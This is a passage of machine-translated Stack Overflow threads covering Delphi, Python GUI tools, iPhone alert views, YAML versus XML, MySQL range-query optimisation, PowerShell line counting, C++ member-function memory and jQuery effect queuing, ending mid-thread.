* * *

## 回答 #10

> 赞同：0
> 
> 时间：2017-12-19T13:24:42.530

要么作为 Out 变量。

```
function GetList(Parameter1: string; out ResultList: TStringList): boolean;
begin
  // either
  if not Assigned(ResultList) then
    raise Exception.Create('Out variable is not declared.');
  // or
  Result := False;
  if not Assigned(ResultList) then
    Exit;
  ResultList.Clear;
  ResultList.Add('Line1');
  ResultList.Add('Line2');
  //...
  Result := True;
end; 
```

或作为字符串。

```
function GetList(Parameter1: string): string;
var
  slList: TStringList;
begin
  slList := TStringList.Create;
  try
    slList.Clear;
    slList.Add('Line1');
    slList.Add('Line2');
    //...
    Result := slList.Text;
  finally
    slList.Free;
  end;
end; 
```

.

```
procedure Main;
var
  slList: TStringList;
begin
  slList := TStringList.Create;
  try
    // either
    GetList(Parameter1, slList);
    // or
    slList.Text := GetList(Parameter1);
    // process slList...
  finally
    slList.Free;
  end;
end; 
```

# python - 我在哪里可以找到 Python 的 GUI 设计器？

> ID：561283
> 
> 赞同：6
> 
> 时间：2009-02-18T14:33:20.643
> 
> 标签：python, user-interface, glade

有谁知道像 Glade 这样的 Python 的 GUI 设计器，但 Windows 的？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-02-18T14:43:14.737

[适用于 Windows 的 Glade/Gtk+](http://sourceforge.net/projects/gladewin32/)与 Glade 完全相同，但适用于 Windows。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-18T14:37:37.217

我建议使用 PyQt 和 Qt-designer（所见即所得的 gui 设计器）来制作跨平台的 gui 应用程序。

Qt 甚至获得了 LGPL，使其更具吸引力。

您可以在以下网址找到 PyQt： [http ://www.riverbankcomputing.co.uk/software/pyqt/download](http://www.riverbankcomputing.co.uk/software/pyqt/download)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-18T14:38:27.743

[http://wxformbuilder.org](http://wxformbuilder.org)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-18T14:42:22.790

我使用[PyQt](http://www.riverbankcomputing.co.uk/software/pyqt/intro/)；它建立在[QT Toolkit](http://qt.nokia.com/)之上。

如果您要部署到 Windows，它可以很好地与[py2exe 模块](http://www.py2exe.org/)配合使用。

它使用起来相当简单，特别是如果您已经有使用 QT 库的经验。

**注意**：这是我对[类似问题](https://stackoverflow.com/questions/529498/gui-builder-for-python/529602#529602)的回答。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-06T18:57:04.793

我使用[wxGlade](http://wxglade.sourceforge.net/)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-03-06T19:15:33.390

它取决于您正在使用的 GUI 工具包。

对于 wxPython，有[boa-constructor](http://boa-constructor.sourceforge.net/)。这是一个类似 Delphi 的 IDE。

# iphone - UIAlertView 上的 UITextView（多行输入）

> ID：561284
> 
> 赞同：1
> 
> 时间：2009-02-18T14:33:45.417
> 
> 标签：iphone, cocoa-touch, textview

当我尝试在 AlertView 上分配**UITextView时遇到了一些问题。**这是我的代码：

```
UIAlertView* minhaCritica = [UIAlertView new];
minhaCritica.title = @"7Arte";
[minhaCritica addButtonWithTitle:@"Cancelar"];
[minhaCritica addButtonWithTitle:@"Enviar"];
minhaCritica.message = @"Escreve a tua crítica:\n\n\n\n";
minhaCritica.delegate = self;
[minhaCritica show];

CGRect frame = minhaCritica.frame;
frame.origin.y -= 100.0f;
minhaCritica.frame = frame;

criticaTxtView = [UITextView alloc];
[criticaTxtView setFont:[UIFont systemFontOfSize:16.0f]];
[criticaTxtView initWithFrame:CGRectMake(20.0, 80.0, 245.0, 40.0)];
[minhaCritica addSubview:criticaTxtView];
[criticaTxtView becomeFirstResponder]; 
```

我的问题是当我开始输入文本时，文本视图在我输入时不会滚动。当前两行已满时，它应该向上滚动一行。

谁能帮我这个？这是一个显示问题的视频：[http ://www.welove.com.pt/7arte.swf](http://www.welove.com.pt/7arte.swf)

此外，我无法将用户输入的文本输入到字段中。我使用过：criticaText = [[alertView textField] text]; 但现在它不适用于上面的代码。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-02-20T15:06:49.207

我认为您正在尝试解决错误的问题。根据 API 文档，警报视图用于“[向用户显示警报消息](http://developer.apple.com/iphone/library/documentation/UIKit/Reference/UIAlertView_Class/UIAlertView/UIAlertView.html)”。您不应该将其用于输入。改用模态视图或类似的东西。

遵循平台的 UI 约定通常是一种很好的做法，如果不这样做可能会导致您的应用程序被 Apple 拒绝。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-11-18T16:52:08.130

听起来相对良性的未记录的 UIAlertView API 不再被允许，因此无论您使用的是文本字段还是文本标签，您都需要使用不同的机制。我建议以下博客文章是如何解决此问题的好例子：

[自定义 UIAlertView（颜色选择器）](http://www.skylarcantu.com/blog/2009/08/14/custom-uialertview-color-chooser/)

[将 UITables 嵌入 UIAlertViews](http://www.skylarcantu.com/blog/2009/10/10/embedding-uitables-into-uialertviews/)

[带提示的警报视图](http://iphonedevelopment.blogspot.com/2009/02/alert-view-with-prompt.html)

从 App Store 的角度来看，这些技术似乎是合法的，并且解决了如何将任何类型的控件嵌入到警报视图中。

# java - yaml vs xml 用于对象图反序列化的优缺点是什么？

> ID：561286
> 
> 赞同：23
> 
> 时间：2009-02-18T14:34:00.750
> 
> 标签：java, xml, serialization, yaml

用例是以文本格式对复杂对象图进行长期序列化。

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2009-02-18T21:36:58.783

## 简短的回答

如果您希望人类创建/阅读文档（配置文件、报告等），那么您可以考虑 YAML，否则选择 XML（用于机器对机器的通信）。

## 长答案

### 长度

XML 和 YAML 大致相同。好的 XML 库可以跳过所有空格，而对于 YAML，它是必需的。一个复杂的 YAML 包含很多缩进空间（不要使用制表符！）

### 网络故障

YAML 文档的一部分通常是有效文档，因此如果 YAML 文档不完整，则无法自动检测它。XML 解析器将始终检查文档是否至少格式正确，并且可以根据模式自动检查有效性。

### 语言支持

许多主要的编程语言都支持[YAML](http://yaml.org/)和 XML。

### 基本知识

您无需向开发人员（即使是初级）解释什么是 XML。YAML 还没有被广泛使用。

### 架构

使用 XML，生产者和消费者都可以就 Schema 达成一致，以建立可靠的数据交换格式。

### 句法

XML 非常丰富：名称空间、实体、属性。

### 外部依赖

Java 和 Python 在标准库中支持 XML。YAML 需要这些语言的外部依赖项。

### 到期

XML 规范较旧，而且坚如磐石；而 YAML 仍在建设中。YAML 1.1 包含不一致的地方（甚至有一个[wiki](http://pyyaml.org/wiki/BugsInTheYAMLSpecification)来维护错误列表）。

### XSLT

如果您需要将 XML 文档转换为另一种格式（XML、HTML、YAML、PDF），您可以使用 XSLT，而对于 YAML，您必须编写程序。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-24T20:38:12.620

我同意：YAML 更具可读性，并且似乎非常适合开发读/写配置文件。但是机器对机器的通信几乎没有什么好处。此外，对于文本标记（xml 的传统优势，如 xhtml、docbook），xml 更好。

特别是对于对象序列化，我想不出使用 YAML 的充分理由。

事实上，我建议改为考虑 JSON：它基于对象（或结构，因为没有行为）模型，而不是分层 (xml) 或关系 (SQL) 模型。因此，它更适合对象数据。但是 XML 也可以正常工作，并且有很多很好的工具。

最后一件事：术语“长期”和“对象序列化”不能混用。后者意味着紧密耦合：您的对象会发生变化，序列化也会发生变化。实际对象序列化不应该用于存储数据，数据绑定/映射更合适。但可能是您在“使用方便的对象包装器存储/恢复数据”的意义上使用序列化；如果是这样，那很好。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-11-14T06:40:09.587

XML 有 xpath 和 xquery。

但是 YAML 具有复杂的键，并允许您使用别名（& * 语法）将一个值复制到许多地方。

我认为 YAML 的优势不是人类可读性，就像他们说的那样……我可以很好地阅读格式正确的 XML。

实际上 YAML 的强项是人类*可写性*。如果您在构建数据模型等时在 iPhone 上快速输入一些数据，则 YAML 更容易输入。别名非常棒。

然后你可以把它转换成任何东西。

YAML 的更高级的特性，比如严格的类型和标签，我从来没有使用过。YAML 人目前正在讨论发布一个“微型 YAML”来与 JSON 竞争，对于我们这些使用它的人来说，基本上就像使用带有别名的更干净的 JSON 一样。

但是正如其他人指出的那样，XML 作为一种标记语言更好，您希望在其中直观地区分数据的哪些部分对最终用户可见。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-18T17:02:20.800

如果您使用 YAML，则通过网络传输的字节数可能会稍微少一些。我认为还不够重要，但在某些情况下它可能是相关的。我还认为 YAML 更易于在文本编辑器中阅读和使用，但这确实有点主观，如果这不是正常的使用场景，这并不重要。

如果带宽不是一个因素，并且您不会经常在文本编辑器中使用 YAML/XML，我认为您使用哪个并不重要。

# java - Java 或脚本

> ID：561296
> 
> 赞同：1
> 
> 时间：2009-02-18T14:37:23.627
> 
> 标签：java, web-applications

与 PHP 等脚本语言相比，使用 Java 构建 Web 应用程序有什么好处？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-18T15:10:03.113

有许多可用于 Java 的高质量开源框架和库。我发现虽然大多数脚本语言都有类似的框架/库，但它们的质量并不总是像 java 中的那样高。

根据个人经验，我尝试用 ruby​​ 重写我们的 Java webapp。我们使用 Http 客户端从服务器拉取 xml 提要。Ruby 的 Http 客户端实现不支持传递多个同名请求参数。我报告了这个错误，提交了一个补丁，并最终在 ruby​​ 中修复（耶开源！）但我在使用 Jabber 和其他库时遇到了类似的问题。

我认为 Java 的 JDBC 实现也不错。它使连接到许多不同的数据库变得非常容易。（我猜你总是可以用脚本语言做 odbc）。

我还认为编译器有助于在构建时而不是运行时发现错误。我认为这是一个好处，但它也有一个缺点（反馈周期）

你可以用脚本语言和 Java 编写很棒的 web 应用程序。你可以用脚本语言和 Java 编写糟糕的 web 应用程序。

这实际上归结为您正在从事的特定项目所需的东西。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-18T15:29:44.157

我想补充一点，通过使用[Grails](http://www.grails.org/)从两个世界中获得一些好处是相当容易的：

*   易于编程的动态语言（[Groovy](http://groovy.codehaus.org/)）
*   与大量现有 Java 库的互操作性
*   如有必要/需要，能够回退到“正常”Java
*   一个完整的[Spring](http://www.springsource.org/)堆栈在后台
*   许多其他优点...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T14:38:57.710

首先，一个会被预编译，另一个不会。

有关更多信息，请参阅[Java 比 PHP 更长寿的 4 个原因](http://serversideguy.blogspot.com/2006/03/4-reasons-java-will-outlive-php-my.html)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-18T15:23:56.963

使用 Java 而不是 PHP 可能没有任何好处。这取决于项目的规模和复杂性，以及许多其他因素。PHP 的执行速度非常快，但 Java 多年来一直在调整，现在在性能方面是一个很好的竞争对手。如果您将复杂的数据模型存储在数据库中，那么有几个包（例如 iBatis 和 Hibernate）可以在开发过程中为您节省时间和金钱。如果您的 Web 应用程序提供了 Web 服务接口，那么业界正在做大量工作来支持 Java 框架（如 Metro）的互操作性。Java 得到了大量开发人员的支持。对于一个非常大的代码库，我发现一种面向对象的语言更容易维护和开发。Java有独特的面向方面的设计选项，比如aspectJ 在 PHP 中不可用。Java 在某些项目上似乎有更长的启动时间，因为往往有一个更复杂的设计过程。

再说一遍，它也很大程度上取决于编写代码的开发人员。可以说，Java 可能是一种比 PHP 更复杂的语言，并且需要一组更胜任的开发人员，他们愿意花时间设计一个好的代码库。

很多这些论点都是个人意见，但也有客观的衡量标准，例如处理复杂性和开发时间。可以肯定的是，这是一个复杂且开放式的问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-18T14:44:11.460

您可以根据需要获得尽可能多的意见，但事实是最终选择并不重要。Java 在纸面上可能更具可扩展性，但是 Facebook 是用 PHP 制作的……

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-18T14:41:32.667

您应该查看最先进的框架，以了解其中的差异：

*   [雄猫](http://tomcat.apache.org/)
*   [老板](http://www.jboss.org/)

# html - 自定义图像处理程序：缓存策略

> ID：561300
> 
> 赞同：1
> 
> 时间：2009-02-18T14:37:58.137
> 
> 标签：html, http, caching, httphandler

# 情景

我正在为通信应用程序构建自定义 CMS。用户可以将图像上传到服务器，然后在他们使用 Markdown 编写的帖子中引用它们。图像存储在数据库中，并以 url 形式引用`images/{id}`。自定义图像处理程序检索这些并设置远期过期标头，因此不会一遍又一遍地获取它们。将图像存储在文件系统中不是每个客户的选择。

帖子以降价和 html 形式存储在数据库中以提高性能。

### 降价

```
###Header
Lorem Ipsum dolor sit amet.  ![funny cat](images/25) 
```

### HTML

```
<h3>Header</h3>
<p>
  Lorem Ipsum dolor sit amet. <img alt="funny cat" src="images/25" />
</p> 
```

# 问题

这些图像也是可编辑的。从缓存的角度来看，这提出了一个问题。编辑图像时，我需要确保浏览器获取最新版本。我提出了以下解决方案，我发现所有这些解决方案都缺乏。

# 可能的解决方案

### 版本字段

使用图像存储版本字段。当图像被编辑产生形式的 url 时增加它`images/{id}/version/{version}`。

如果图像 url 总是从数据库生成，这很好。但是，我将 url 作为文本存储在帖子中，并且必须为这些请求预处理可能的大量文本。此外，链接图像会很麻烦，因为在编辑图像后 url 会变得陈旧。这可能不是一个好主意。

### 新网址

编辑图像时，将其作为新条目存储在数据库中。

这意味着没有版本维护，但旧链接和旧帖子会遇到同样的问题。他们永远不会更新。性能会很好，但问题仍然存在。

### 304 - 未修改

存储每个图像的最后编辑字段。当有条件请求返回时，返回 http 状态 304 - 未修改，减少带宽使用。

这似乎是迄今为止我得到的最好的解决方案。除非经过编辑，否则图像会被缓存，但我以前从未使用过这种方法。如果页面上有 50 张图像，则仍有 50 个请求向服务器发送。带宽将减少，但延迟仍然存在。这种方法值得付出这样的代价吗？

# 问题

我在这方面的经验很少，我希望你们所有人都有更多。上述任何解决方案是否可行？如果是这样，您对他们的体验如何？如果不是什么是更好的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T15:13:40.360

正如您所说，Conditional GET 它是最好的选择，因为您只需要检查一个请求标头（If-None-Match 或 If-Modified-Since）并发送回相应的状态代码（200 或 304）和一个标头（E-Tag 或 Last-Modified）。然后浏览器将处理图像缓存。

此外，根据您的服务器框架，如果您将图像存储在数据库中，您可以在第一次需要它们时缓存它们（在有限的时间内，因此您不会消耗所有服务器内存）。当您需要重复读取相同的图像时，这会有所帮助，从而节省数据库查询。当然，如果您编辑它们，您需要从服务器缓存中删除您的图像。

编辑：感谢您接受答案。如果您需要，这里有一个很好的解释性链接：[RSS 黑客的 HTTP Conditional Get](http://fishbowl.pastiche.org/2002/10/21/http_conditional_get_for_rss_hackers/)。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2009-02-18T14:45:13.470

将图像放在磁盘上，让您的网络服务器处理它。

该文件可以保持相同的名称（以及因此的 URL），并且 Web 服务器可以处理来自浏览器的修改后的标头。浏览器也可以对带有已知扩展名的 URL 感到更满意。

将图像放入数据库并通过脚本提供它们通常不是一个好主意。只需引用数据库中的 URL。

# python - 在应用程序中实现聊天？

> ID：561301
> 
> 赞同：3
> 
> 时间：2009-02-18T14:38:01.520
> 
> 标签：python, chat

我正在制作一个游戏，我在服务器端使用 Python。

使用 Python 自己实现聊天是相当简单的——这不是我的问题。
**我的问题是**
我只是想知道是否有任何预制的聊天服务器或某种服务可以在我的游戏中实现而不是滚动我自己的聊天服务器？
也许就像我可以在我的游戏服务器进程旁边运行的不同进程一样？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-02-18T14:40:42.997

我推荐使用 XMPP/Jabber。有很多不同语言的客户端和服务器库。它是免费/开源的。

[http://en.wikipedia.org/wiki/XMPP](http://en.wikipedia.org/wiki/XMPP)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T14:45:15.170

也许您可以将 IRC 用作聊天服务，我知道[irclib](http://python-irclib.sourceforge.net/) for python，它更像是一个客户端，但理论上，您可以使用它从游戏服务器代理另一个 IRC 服务器。

这有点hackish，我只是想我会提到它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-19T08:42:01.477

老实说，我认为最好让你自己推出并让它与你的程序紧密集成。我知道重新发明轮子没有任何意义，但在您的情况下这样做有几个优点：集成、学习、安全和简单。

# sql - 优化查询选择时间段

> ID：561312
> 
> 赞同：3
> 
> 时间：2009-02-18T14:40:20.097
> 
> 标签：sql, mysql, query-optimization

给定下表：

```
Table events
id
start_time
end_time 
```

有没有办法快速搜索常数？

例如

```
SELECT *
FROM events
WHERE start_time<='2009-02-18 16:27:12' 
AND     end_time>='2009-02-18 16:27:12' 
```

我正在使用 MySQL。在任一字段上都有索引仍然需要检查范围。此外，两个字段上的索引不会产生影响（仅使用第一个）。

我可以向表中添加字段/索引（因此添加包含两个字段信息的索引构造字段是可以接受的）。

PS对此的需求来自这个问题：[Optimize SQL that uses between子句](https://stackoverflow.com/questions/557425/optimize-sql-that-uses-between-clause)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-02-19T20:02:05.517

我的解决方案有一个警告：

1) 这个解决方案的警告是你必须使用 MyISAM 引擎作为事件表。如果您不能使用 MyISAM，那么此解决方案将不起作用，因为空间索引仅支持 MyISAM。

因此，假设上述对您来说不是问题，以下应该可以工作并为您提供良好的性能：

此解决方案利用 MySQL 对空间数据的支持（请参阅[此处的文档](http://dev.mysql.com/doc/refman/5.0/en/spatial-extensions.html)）。虽然可以将空间数据类型添加到各种存储引擎中，但为了获得所需的性能，空间 R-Tree 索引（请参阅[此处的文档）仅支持 MyISAM。](http://dev.mysql.com/doc/refman/5.0/en/creating-spatial-indexes.html)另一个限制是空间数据类型仅适用于数字数据，因此您不能将此技术用于基于字符串的范围查询。

我不会详细介绍空间类型如何工作以及空间索引如何有用的理论细节，但您应该查看[Jeremy Cole 的解释](http://jcole.us/blog/archives/2007/11/24/on-efficiently-geo-referencing-ips-with-maxmind-geoip-and-mysql-gis/)，了解如何使用空间数据类型和索引进行 GeoIP 查找。如果您需要原始性能并且可以放弃一些准确性，还请查看评论，因为它们提出了一些有用的观点和替代方案。

基本前提是我们可以使用 start/end 并使用它们中的两个创建四个不同的点，一个用于在 xy 网格上以 0,0 为中心的矩形的每个角，然后快速查找空间index 来确定我们关心的特定时间点是否在矩形内。如前所述，请参阅 Jeremy Cole 的解释，以更全面地了解其工作原理。

在您的特定情况下，我们将需要执行以下操作：

1) 将表更改为 MyISAM 表（请注意，除非您完全了解此类更改的后果，例如缺少与 MyISAM 关联的事务和表锁定行为，否则不应这样做）。

```
alter table events engine = MyISAM; 
```

2）接下来我们添加将保存空间数据的新列。我们将使用多边形数据类型，因为我们需要能够容纳一个完整的矩形。

```
alter table events add column time_poly polygon NOT NULL; 
```

3）接下来我们用数据填充新列（请记住，任何更新或插入表事件的进程都需要修改以确保它们也填充新列）。由于开始和结束范围是时间，我们需要使用 unix_timestamp 函数将它们转换为数字（有关其工作原理，请参阅[此处](http://dev.mysql.com/doc/refman/5.1/en/date-and-time-functions.html#function_unix-timestamp)的文档）。

```
update events set time_poly := LINESTRINGFROMWKB(LINESTRING(
    POINT(unix_timestamp(start_time), -1),
    POINT(unix_timestamp(end_time), -1),
    POINT(unix_timestamp(end_time), 1),
    POINT(unix_timestamp(start_time), 1),
    POINT(unix_timestamp(start_time), -1)
  )); 
```

4）接下来我们将空间索引添加到表中（如前所述，这仅适用于 MyISAM 表并且会产生错误“ERROR 1464 (HY000): The used table type doesn't support SPATIAL index”）。

```
alter table events add SPATIAL KEY `IXs_time_poly` (`time_poly`); 
```

5）接下来，您将需要使用以下选择，以便在查询数据时使用空间索引。

```
SELECT * 
FROM events force index (IXs_time_poly)
WHERE MBRCONTAINS(events.time_poly, POINTFROMWKB(POINT(unix_timestamp('2009-02-18 16:27:12'), 0))); 
```

强制索引可以 100% 确保 MySQL 将使用索引进行查找。如果一切顺利，在上述选择上运行解释应该显示类似于以下内容：

```
mysql> explain SELECT *
    -> FROM events force index (IXs_time_poly)
    -> on MBRCONTAINS(events.time_poly, POINTFROMWKB(POINT(unix_timestamp('2009-02-18 16:27:12'), 0)));
+----+-------------+-------+-------+---------------+---------------+---------+------+------+-------------+
| id | select_type | table | type  | possible_keys | key           | key_len | ref  | rows | Extra       |
+----+-------------+-------+-------+---------------+---------------+---------+------+------+-------------+
|  1 | SIMPLE      | B     | range | IXs_time_poly | IXs_time_poly | 32      | NULL |    1 | Using where | 
+----+-------------+-------+-------+---------------+---------------+---------+------+------+-------------+
1 row in set (0.00 sec) 
```

请参阅 Jeremy Cole 的分析，了解与 between 子句相比此方法的性能优势的详细信息。

如果您有任何问题，请告诉我。

谢谢，

-蘸

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-18T14:50:41.210

没有有效的方法可以在`MySQL`.

但是，如果您的范围不重叠，您可以使用`start_time <= const`with`ORDER BY start_time DESC LIMIT 1`并进一步检查`end_time >= const`.

您需要在函数中执行此操作，因为如果范围条件取自超级查询，则`MySQL`由于某种原因不会在子查询中使用`INDEX RANGE SCAN`for 。`ORDER BY`

```
CREATE UNIQUE INDEX ux_b_start ON b (start_date);

CREATE FUNCTION `fn_get_last_b`(event_date TIMESTAMP) RETURNS int(11)
BEGIN
  DECLARE id INT;
  SELECT b.id
  INTO id
  FROM b
  FORCE INDEX (ux_b_start)
  WHERE b.start_time <= event_date
  ORDER BY
    b.start_time DESC
  LIMIT 1;
  RETURN id;
END;

SELECT COUNT(*) FROM a;

1000

SELECT COUNT(*) FROM b;

200000

SELECT *
FROM (
  SELECT fn_get_last_b(a.event_time) AS bid,
         a.*
  FROM a
) ao, b FORCE INDEX (PRIMARY)
WHERE b.id = ao.bid
  AND b.end_time >= ao.event_time

1000 rows fetched in 0,0143s (0,1279s) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T15:49:23.283

我对 MySQL 没有太多经验，但在 MS SQL Server 上，在两列上添加索引允许在 1M 行表上进行索引查找和返回时间从 1-2 秒变为毫秒响应时间。

您似乎看到了不同的结果。我想知道约束是否有所作为。我有一个检查约束来强制执行 start_time < end_time。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T22:22:45.227

您基本上得到了一个具有 2 个截然不同的范围条件的查询。您正在使用 >=，对于 MySQL，这始终是范围扫描。[这里](http://dev.mysql.com/doc/refman/5.0/en/range-optimization.html)有文档来优化范围扫描。

底线是 MySQL 执行额外的检查以过滤掉满足范围条件的行，然后满足 WHERE 子句的其余部分，在您的情况下是另一个范围条件。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-01-07T18:36:57.000

我打算问一个关于优化事件搜索的类似问题（具有开始和停止时间的项目），我已经在使用不同的方法，所以我会把它扔在那里。

基本上，如果您知道您的事件永远不会大于给定的持续时间，您可以搜索大于最大持续时间的有界范围，然后添加限制以摆脱匹配的额外内容。因此，要获得与搜索时间相交的时间：

```
SELECT *
FROM events
WHERE 
   ( start_time BETWEEN ( 'search_start' - INTERVAL 2 DAY ) and 'search_end' )
   AND end_time >= 'search_start' 
```

...你会想要在`start_time`.

（注意——我的表在 4 年内有数百万个事件，没有超过 24 小时的记录......我不知道这相对于空间搜索方法的表现如何，因为我将不得不自己去尝试.)

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2009-02-18T14:53:30.267

在一张桌子内您无能为力。如果优化这些查询 1) 是必要的 2) 必须在 SQL 级别完成，那么您需要创建一个派生表：

```
Table event_times
id
event_id
mark_time 
```

并为每个事件跨越的每个时间单位添加一条记录。那你就

```
SELECT *
FROM events
LEFT JOIN event_times ON event_id = events.id
WHERE mark_time = '2009-02-18 16:27:12' 
```

您可以通过定义“时间单位”的方式使该表不那么荒谬，即如果您将mark_time 的分辨率限制为分钟或小时而不是秒。

# powershell - 使用powershell查找项目中的行数

> ID：561327
> 
> 赞同：40
> 
> 时间：2009-02-18T14:44:21.210
> 
> 标签：powershell

我正在尝试找到一种方法来计算我拥有的项目的所有源文件中的总行数。我试过管道`dir -r -name`进入`measure-object -line`，但这只是计算我拥有的文件数。

有没有人有脚本可以做到这一点？

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2009-02-18T19:50:04.937

```
Get-ChildItem -Filter "*.cs" -Recurse | Get-Content | Measure-Object -line 
```

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2009-02-18T17:13:26.203

感谢所有回答的人。我最终实施的方式是

```
dir . -filter "*.cs" -Recurse -name | foreach{(GC $_).Count} | measure-object -sum 
```

> GC 是 Get-Content
> 的别名 dir 是 Get-ChildItem 的别名

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2014-06-11T13:35:44.770

我刚刚过期了一点，发现这个命令确实递归地测量了所有 c# 文件：

`Get-ChildItem -Filter *.cs -Recurse | Get-Content | Measure-Object -Word -Line -Character`

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2009-02-18T15:47:35.613

```
Get-ChildItem . -Include *.txt -Recurse | foreach {(Get-Content $_).Count} 
```

用别名浓缩一点：

```
GCI . -Include *.txt -Recurse | foreach{(GC $_).Count} 
```

将给出与此类似的结果：

```
Lines Words               Characters              Property
----- -----               ----------              --------
   21
   40
   29
   15
  294
   13
   13
  107 
```

编辑：修改为通过子文件夹递归。

编辑 2：删除了 Measure-Object 的使用。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2009-02-18T15:46:00.857

目录 **.txt -recurse | 选择全名，@{name="LineCount";表达式={ @(get-content $_.fullname).count }}

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2017-02-24T22:30:29.280

**打印文件名和行数：**

```
Get-ChildItem -re -in "*.cs" |
Foreach-Object { 
    $fileStats = Get-Content $_.FullName | Measure-Object -line
    $linesInFile = $fileStats.Lines
    Write-Host "$_=$linesInFile" 
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-01-14T00:58:21.007

由于我需要类似的东西，这就是我想出的。

一种文件类型：GET-ChildItem -Recurse -Filter '*.cs' | 获取内容 | 测量对象线

多种文件类型：GET-ChildItem -Recurse -Include ' *.cs'、'.* aspx'、'*.ascx' | 获取内容 | 测量对象线

* * *

## 回答 #8

> 赞同：-2
> 
> 时间：2020-08-31T18:19:14.980

计算`No. of lines`目录内的文件：

```
GCI . -Include *.* -Recurse | foreach{(GC $_).Count} 
```

计算`SUM of lines`目录内的文件：

```
GCI . -Include *.* -Recurse | foreach{(GC $_).Count} | measure-object -sum 
```

# c++ - 关于sizeof和类成员函数的问题

> ID：561339
> 
> 赞同：3
> 
> 时间：2009-02-18T14:47:13.480
> 
> 标签：c++, sizeof

```
 class B
{
   public:
     int a;
     void fn();
} 
```

如果我创建 B 的对象，使用

```
B* pb = new B; 
```

fn() 的内存在哪里？

对象中是否有指向 fn() 的内存位置的指针？

如果是，为什么 sizeof(B) 返回值，就好像对象中根本没有指针一样？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2009-02-18T14:50:41.210

> fn() 的内存在哪里？

因为它是一个正常的功能，在你程序的代码部分的某个地方。该位置对于类的*所有实例*都是相同的。`B`实际上，它与via的实例化无关`pb`。

> 对象中是否有指向 fn() 的内存位置的指针？

不。对于普通的成员函数，这不是必需的，因为地址在编译时（或最迟在链接时）是已知的；因此它不必在运行时单独存储。

对于虚函数，情况就不同了。虚函数指针存储在一个数组中（称为“虚函数指针表”或简称“vtable”）。每个类都有一个这样的 vtable，并且每个类的实例都存储一个指向该 vtable 的指针。这是必要的，因为如果类型的指针/引用`Base`指向子类`Derived`，编译器无法知道要调用哪个函数；相反，正确的函数是在运行时通过在关联的 vtable 中查找来计算的。`sizeof`vtable 指针在对象中也很明显。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-02-18T15:04:38.883

这：

```
class B
{
   public:
     int a;
     void fn();
}; 
```

出于所有实际目的，等同于 C 代码：

```
struct B
{
   int a;
};

void fn(B* bInstance); 
```

除了在 C++ 版本中 bInstance 被替换为 this 指针。这两个函数的内存都存在于堆栈中。所以转换为 struct equivelant，你认为 sizeof(B) 会是多少？

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-18T14:49:13.520

只会为虚拟函数（在 vtable 中）存储一个指针，而不是为非虚拟函数存储一个指针。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-18T14:53:48.613

1) B* pb = new B 将在堆上分配内存。这意味着，除其他外，您需要通过 delete 运算符自行清理它。或者，您可以将指针放在智能指针（shared_ptr、auto_ptr.scope_ptr）中并让它进行清理。

2）因为指针是类型，指向一个对象或null，有定义的大小，通常等于int。

3) fn() 不是虚函数，因此在对象中没有为 vtable 分配内存。

# javascript - jQuery 队列事件

> ID：561346
> 
> 赞同：7
> 
> 时间：2009-02-18T14:49:03.523
> 
> 标签：javascript, jquery

所以我想做的是使用 jQuery 为我正在使用的一些 AJAX 调用协调一些效果。我的问题是第二个div的fadeIn与第一个div的fadeOut同时触发。

这也可能适用于其他事件，所以我很好奇，有没有办法让 fadeId 仅在 fadeOut 完成后启动？

```
jQuery("#div1").fadeOut("slow"); 
jQuery("#div2").fadeIn("slow"); 
```

谢谢

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-07-20T05:06:24.233

对于快速动画来说，这通常已经足够了，但是如果你想将一些效果排队，你也可以使用 queue() 和 dequeue() 方法，如下所示：

```
 $("#div1").fadeOut();
$("#div1").queue(function()
{
   $(this).fadeIn();
   $(this).dequeue();
});
$("#div").queue(function() 
{
   $(this).html("And now I'm sliding up. Wee!");
   $(this).slideUp("slow");
   $(this).dequeue();
}); 
```

在这里，queue() 将一个函数添加到对象的队列（不一定是动画），然后 dequeue() 执行该函数。

有关更多信息，请参阅[文档](http://docs.jquery.com/Core/queue)。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-02-18T14:51:48.197

